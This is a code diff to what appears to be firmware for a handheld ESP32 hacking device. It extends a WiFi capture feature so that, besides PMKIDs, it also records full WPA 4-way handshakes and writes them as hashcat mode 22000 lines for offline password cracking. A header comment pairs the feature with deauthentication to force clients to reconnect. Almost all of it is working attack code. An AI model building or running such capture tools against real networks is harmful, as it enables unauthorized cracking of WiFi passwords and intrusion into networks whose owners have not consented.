@@ -1,12 +1,19 @@
 /*
- * wifi_pmkid — passive EAPOL M1 capture to hashcat 22000 format.
+ * wifi_pmkid — EAPOL capture → hashcat 22000 format.
  *
- * Listens in promiscuous for 802.1X EAPOL-Key frames. PMKID is embedded
- * in the RSN/WPA IE of the first EAPOL message from the AP. Extracts
- * BSSID, station MAC, SSID (from earlier beacon capture), and the 16-byte
- * PMKID. Writes one line per capture to /poseidon/hashcat.22000.
+ * Captures both:
+ *   WPA*01*  PMKID (from M1 of the 4-way) — passive, no client needed
+ *   WPA*02*  Full 4-way handshake (M1 ANonce + M2 SNonce + MIC) —
+ *            requires an actual client associating (trigger with deauth)
  *
- * Users feed that file into hashcat mode 22000 to crack offline.
+ * Strategy:
+ *   - Cache SSIDs from beacons/probe-responses by BSSID.
+ *   - On every EAPOL-Key frame:
+ *       * Check if it has a PMKID KDE — if yes, emit WPA*01*.
+ *       * If it's M1 (from AP, Install=0, ACK=1): remember ANonce per
+ *         (BSSID, STA) pair.
+ *       * If it's M2 (from STA, Install=0, ACK=0, MIC=1): pair with the
+ *         stored ANonce and emit WPA*02* with the captured EAPOL frame.
  */
 #include "app.h"
 #include "ui.h"
@@ -16,17 +23,31 @@
 #include <esp_wifi.h>
 #include <SD.h>
 
-static volatile uint32_t s_captured = 0;
+static volatile uint32_t s_pmkids = 0;
+static volatile uint32_t s_handshakes = 0;
 static volatile uint32_t s_eapol_seen = 0;
 static volatile uint8_t  s_current_ch = 1;
 static volatile bool     s_running = false;
 static File              s_out;
 
-/* Minimal BSSID → SSID cache populated from beacons. */
+/* BSSID → SSID cache. */
 struct bssid_ssid_t { uint8_t bssid[6]; char ssid[33]; };
 #define BS_CACHE 32
 static bssid_ssid_t s_cache[BS_CACHE];
 static int          s_cache_n = 0;
+
+/* Pending M1 ANonce per (BSSID, STA). */
+#define M1_CACHE 16
+struct m1_entry_t {
+    uint8_t  bssid[6];
+    uint8_t  sta[6];
+    uint8_t  anonce[32];
+    uint8_t  m1_eapol[256];
+    int      m1_len;
+    uint32_t ts;
+};
+static m1_entry_t s_m1[M1_CACHE];
+static int        s_m1_n = 0;
 
 static const char *ssid_for(const uint8_t *bssid)
 {
@@ -56,81 +77,205 @@ static void hex_append(char *buf, const uint8_t *data, int n)
     for (int i = 0; i < n; ++i) off += sprintf(buf + off, "%02x", data[i]);
 }
 
-/* Parse the EAPOL-Key M1 for a PMKID in the RSN IE. */
-static void try_extract_pmkid(const uint8_t *frame, int len, uint8_t current_ch)
+/* Find or insert the M1 slot for this (bssid, sta) pair. */
+static m1_entry_t *m1_slot(const uint8_t *bssid, const uint8_t *sta)
 {
-    /* We expect a QoS Data frame (type 2, subtype 8) or plain data,
-     * containing LLC/SNAP header + EAPOL + Key descriptor. */
-    if (len < 40) return;
+    for (int i = 0; i < s_m1_n; ++i) {
+        if (memcmp(s_m1[i].bssid, bssid, 6) == 0 &&
+            memcmp(s_m1[i].sta,   sta,   6) == 0) return &s_m1[i];
+    }
+    if (s_m1_n >= M1_CACHE) {
+        /* Evict oldest. */
+        int oldest = 0;
+        for (int i = 1; i < s_m1_n; ++i)
+            if (s_m1[i].ts < s_m1[oldest].ts) oldest = i;
+        return &s_m1[oldest];
+    }
+    m1_entry_t *e = &s_m1[s_m1_n++];
+    memcpy(e->bssid, bssid, 6);
+    memcpy(e->sta,   sta,   6);
+    return e;
+}
+
+/* Emit WPA*01* (PMKID) */
+static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t *sta)
+{
+    if (!s_out) return;
+    const char *ssid = ssid_for(bssid);
+    char line[300] = "WPA*01*";
+    hex_append(line, pmkid, 16);
+    strcat(line, "*");
+    hex_append(line, bssid, 6);
+    strcat(line, "*");
+    hex_append(line, sta, 6);
+    strcat(line, "*");
+    for (size_t i = 0; i < strlen(ssid); ++i) {
+        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
+        strcat(line, h);
+    }
+    strcat(line, "***\n");
+    s_out.print(line);
+    s_out.flush();
+    s_pmkids++;
+}
+
+/* Emit WPA*02* (full 4-way handshake). Requires M1 ANonce and M2 EAPOL blob. */
+static void emit_handshake(const uint8_t *bssid, const uint8_t *sta,
+                           const uint8_t *mic, const uint8_t *anonce,
+                           const uint8_t *m2_eapol, int m2_len)
+{
+    if (!s_out) return;
+    const char *ssid = ssid_for(bssid);
+    /* hashcat 22000 format:
+       WPA*02*MIC*MAC_AP*MAC_STA*ESSID_HEX*ANONCE*EAPOL_FRAME_HEX*MSG_PAIR */
+    char line[1024] = "WPA*02*";
+    hex_append(line, mic, 16);
+    strcat(line, "*");
+    hex_append(line, bssid, 6);
+    strcat(line, "*");
+    hex_append(line, sta, 6);
+    strcat(line, "*");
+    for (size_t i = 0; i < strlen(ssid); ++i) {
+        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
+        strcat(line, h);
+    }
+    strcat(line, "*");
+    hex_append(line, anonce, 32);
+    strcat(line, "*");
+    hex_append(line, m2_eapol, m2_len);
+    strcat(line, "*02\n");  /* message_pair=02: M1+M2, challenge. */
+    s_out.print(line);
+    s_out.flush();
+    s_handshakes++;
+}
+
+/* Parse an EAPOL-Key frame. Returns everything we need to know about it. */
+struct eapol_key_info_t {
+    bool     is_key;
+    uint16_t key_info;        /* big-endian info field */
+    const uint8_t *key_nonce; /* 32 bytes */
+    const uint8_t *key_mic;   /* 16 bytes */
+    uint16_t kd_len;
+    const uint8_t *kd_data;
+    const uint8_t *eapol_raw; /* full EAPOL blob (for 22000 format) */
+    int      eapol_len;
+};
+
+static bool parse_eapol(const uint8_t *frame, int len,
+                        const uint8_t **out_bssid, const uint8_t **out_sta,
+                        bool *from_ap,
+                        eapol_key_info_t *ki)
+{
+    if (len < 40) return false;
     uint8_t fc  = frame[0];
     uint8_t subtype = (fc >> 4) & 0xF;
     uint8_t type    = (fc >> 2) & 0x3;
-    if (type != 2) return;  /* data */
+    if (type != 2) return false;
+    uint8_t from_ds = (frame[1] >> 1) & 1;
+    uint8_t to_ds   = (frame[1])     & 1;
 
     int hdr_len = 24;
-    /* QoS adds 2 bytes. */
     if (subtype & 0x8) hdr_len += 2;
-    /* Order bit implies HT control — skip conservatively. */
 
-    const uint8_t *bssid = &frame[4];  /* Addr1 for AP→STA */
-    const uint8_t *sta   = &frame[10]; /* Addr2 (sender) */
+    /* Determine source/destination. */
+    const uint8_t *addr1 = &frame[4];   /* dst */
+    const uint8_t *addr2 = &frame[10];  /* src / sender */
+    const uint8_t *addr3 = &frame[16];  /* bssid (typically) */
+    (void)addr3;
 
-    if (len < hdr_len + 8) return;
-    /* LLC+SNAP must be 0xAAAA03 000000 then ethertype 888E (EAPOL). */
+    /* LLC+SNAP check. */
+    if (len < hdr_len + 8) return false;
     const uint8_t *llc = frame + hdr_len;
     if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
-          llc[6] == 0x88 && llc[7] == 0x8E)) return;
-
-    s_eapol_seen++;
+          llc[6] == 0x88 && llc[7] == 0x8E)) return false;
 
     const uint8_t *eapol = llc + 8;
     int eapol_len = len - (int)(eapol - frame);
-    if (eapol_len < 95) return;
-    /* EAPOL header: version(1) type(1) body_length(2) */
-    if (eapol[1] != 0x03) return;  /* not EAPOL-Key */
-    /* Key descriptor follows. Look for RSN IE with PMKID field at end. */
-    /* The 802.11-specific key data comes at offset 95 (key_data_length). */
-    uint16_t kd_len = ((uint16_t)eapol[93] << 8) | eapol[94];
-    if (kd_len < 22) return;  /* smallest PMKID TLV is 22 bytes */
-    const uint8_t *kd = eapol + 95;
-    if (eapol_len < 95 + kd_len) return;
+    if (eapol_len < 95) return false;
+    if (eapol[1] != 0x03) return false;  /* not EAPOL-Key */
 
-    /* Walk TLVs looking for vendor specific PMKID. */
-    int off = 0;
-    while (off + 2 < kd_len) {
-        uint8_t tlv_type = kd[off];
-        uint8_t tlv_len  = kd[off + 1];
-        if (off + 2 + tlv_len > kd_len) break;
-        /* PMKID KDE: type 0xDD (vendor specific), OUI 00:0F:AC, KDE type 4. */
-        if (tlv_type == 0xDD && tlv_len >= 20 &&
-            kd[off + 2] == 0x00 && kd[off + 3] == 0x0F && kd[off + 4] == 0xAC &&
-            kd[off + 5] == 0x04) {
-            const uint8_t *pmkid = kd + off + 6;
-            const char *ssid = ssid_for(bssid);
-            if (!s_out) return;
-            /* hashcat 22000 line:
-               WPA*01*PMKID*MAC_AP*MAC_STA*ESSID_HEX*** */
-            char line[300] = "WPA*01*";
-            hex_append(line, pmkid, 16);
-            strcat(line, "*");
-            hex_append(line, bssid, 6);
-            strcat(line, "*");
-            hex_append(line, sta, 6);
-            strcat(line, "*");
-            char *essid_slot = line + strlen(line);
-            (void)essid_slot;
-            for (size_t i = 0; i < strlen(ssid); ++i) {
-                char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
-                strcat(line, h);
+    if (from_ds && !to_ds) {
+        /* AP → STA: addr1 = STA, addr2 = BSSID. */
+        *out_sta   = addr1;
+        *out_bssid = addr2;
+        *from_ap   = true;
+    } else if (to_ds && !from_ds) {
+        /* STA → AP: addr1 = BSSID, addr2 = STA. */
+        *out_bssid = addr1;
+        *out_sta   = addr2;
+        *from_ap   = false;
+    } else {
+        return false;
+    }
+
+    ki->is_key    = true;
+    ki->key_info  = ((uint16_t)eapol[5] << 8) | eapol[6];
+    ki->key_nonce = eapol + 17;
+    ki->key_mic   = eapol + 81;
+    ki->kd_len    = ((uint16_t)eapol[93] << 8) | eapol[94];
+    ki->kd_data   = eapol + 95;
+    ki->eapol_raw = eapol;
+    ki->eapol_len = eapol_len;
+    return true;
+}
+
+static void handle_eapol(const uint8_t *frame, int len)
+{
+    const uint8_t *bssid, *sta;
+    bool from_ap;
+    eapol_key_info_t ki = {};
+    if (!parse_eapol(frame, len, &bssid, &sta, &from_ap, &ki)) return;
+    s_eapol_seen++;
+
+    /* PMKID lives in the key data TLVs. Always check. */
+    if (ki.kd_len >= 22) {
+        int off = 0;
+        while (off + 2 < ki.kd_len) {
+            uint8_t tlv_type = ki.kd_data[off];
+            uint8_t tlv_len  = ki.kd_data[off + 1];
+            if (off + 2 + tlv_len > ki.kd_len) break;
+            if (tlv_type == 0xDD && tlv_len >= 20 &&
+                ki.kd_data[off + 2] == 0x00 &&
+                ki.kd_data[off + 3] == 0x0F &&
+                ki.kd_data[off + 4] == 0xAC &&
+                ki.kd_data[off + 5] == 0x04) {
+                emit_pmkid(ki.kd_data + off + 6, bssid, sta);
+                break;
             }
-            strcat(line, "***\n");
-            s_out.print(line);
-            s_out.flush();
-            (void)current_ch;
-            s_captured++;
-            return;
+            off += 2 + tlv_len;
         }
-        off += 2 + tlv_len;
+    }
+
+    /* 4-way handshake detection.
+       Key info bits:  8=MIC present, 6=ACK, 4=install, 3=PairwiseKey */
+    bool mic_set     = (ki.key_info & (1 << 8)) != 0;
+    bool ack_set     = (ki.key_info & (1 << 7)) != 0;
+    bool install_set = (ki.key_info & (1 << 6)) != 0;
+
+    /* M1: from AP, ACK=1, MIC=0, Install=0. */
+    if (from_ap && ack_set && !mic_set && !install_set) {
+        m1_entry_t *e = m1_slot(bssid, sta);
+        if (e) {
+            memcpy(e->bssid, bssid, 6);
+            memcpy(e->sta,   sta,   6);
+            memcpy(e->anonce, ki.key_nonce, 32);
+            int copy_len = ki.eapol_len < (int)sizeof(e->m1_eapol) ? ki.eapol_len : (int)sizeof(e->m1_eapol);
+            memcpy(e->m1_eapol, ki.eapol_raw, copy_len);
+            e->m1_len = copy_len;
+            e->ts = millis();
+        }
+        return;
+    }
+
+    /* M2: from STA, MIC=1, ACK=0, Install=0. Pair with stored M1. */
+    if (!from_ap && mic_set && !ack_set && !install_set) {
+        m1_entry_t *e = m1_slot(bssid, sta);
+        if (e && e->m1_len > 0) {
+            /* Use M2's EAPOL frame body for the 22000 "eapol" field
+             * (hashcat prefers M2 for decoded MIC). */
+            emit_handshake(bssid, sta, ki.key_mic, e->anonce,
+                           ki.eapol_raw, ki.eapol_len);
+        }
     }
 }
 
@@ -141,12 +286,10 @@ static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
     if (len < 24) return;
     if (type == WIFI_PKT_MGMT) {
         uint8_t st = (pkt->payload[0] >> 4) & 0xF;
-        if (st == 0x8 || st == 0x5) {
-            /* beacon / probe response — cache BSSID→SSID. */
+        if (st == 0x8 || st == 0x5)
             cache_beacon(pkt->payload + 16, pkt->payload + 36, len - 36 - 4);
-        }
     } else if (type == WIFI_PKT_DATA) {
-        try_extract_pmkid(pkt->payload, len, s_current_ch);
+        handle_eapol(pkt->payload, len);
     }
 }
 
@@ -170,9 +313,11 @@ void feat_wifi_pmkid(void)
     s_out = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
     if (!s_out) { ui_toast("cant open file", COL_BAD, 1500); return; }
 
-    s_captured = 0;
+    s_pmkids = 0;
+    s_handshakes = 0;
     s_eapol_seen = 0;
     s_cache_n = 0;
+    s_m1_n = 0;
     s_current_ch = 1;
     s_running = true;
 
@@ -186,22 +331,24 @@ void feat_wifi_pmkid(void)
     ui_draw_footer("`=stop");
     auto &d = M5Cardputer.Display;
     d.setTextColor(COL_BAD, COL_BG);
-    d.setCursor(4, BODY_Y + 2); d.print("PMKID CAPTURE");
-    d.drawFastHLine(4, BODY_Y + 12, 120, COL_BAD);
+    d.setCursor(4, BODY_Y + 2); d.print("HANDSHAKE CAPTURE");
+    d.drawFastHLine(4, BODY_Y + 12, 150, COL_BAD);
 
     uint32_t last = 0;
     while (true) {
         if (millis() - last > 300) {
             last = millis();
-            d.fillRect(0, BODY_Y + 18, SCR_W, 60, COL_BG);
+            d.fillRect(0, BODY_Y + 18, SCR_W, 70, COL_BG);
             d.setTextColor(COL_FG, COL_BG);
-            d.setCursor(4, BODY_Y + 18); d.printf("channel: %u", s_current_ch);
-            d.setCursor(4, BODY_Y + 30); d.printf("EAPOLs:  %lu", (unsigned long)s_eapol_seen);
-            d.setTextColor(s_captured > 0 ? COL_GOOD : COL_DIM, COL_BG);
-            d.setCursor(4, BODY_Y + 42); d.printf("PMKIDs:  %lu", (unsigned long)s_captured);
+            d.setCursor(4, BODY_Y + 18); d.printf("channel:    %u", s_current_ch);
+            d.setCursor(4, BODY_Y + 30); d.printf("EAPOLs:     %lu", (unsigned long)s_eapol_seen);
+            d.setTextColor(s_pmkids > 0 ? COL_GOOD : COL_DIM, COL_BG);
+            d.setCursor(4, BODY_Y + 42); d.printf("PMKIDs:     %lu", (unsigned long)s_pmkids);
+            d.setTextColor(s_handshakes > 0 ? COL_GOOD : COL_DIM, COL_BG);
+            d.setCursor(4, BODY_Y + 54); d.printf("Handshakes: %lu", (unsigned long)s_handshakes);
             d.setTextColor(COL_DIM, COL_BG);
-            d.setCursor(4, BODY_Y + 60); d.print("/poseidon/hashcat.22000");
-            ui_draw_status(radio_name(), "pmkid");
+            d.setCursor(4, BODY_Y + 70); d.print("/poseidon/hashcat.22000");
+            ui_draw_status(radio_name(), "capture");
         }
         uint16_t k = input_poll();
         if (k == PK_NONE) { delay(20); continue; }
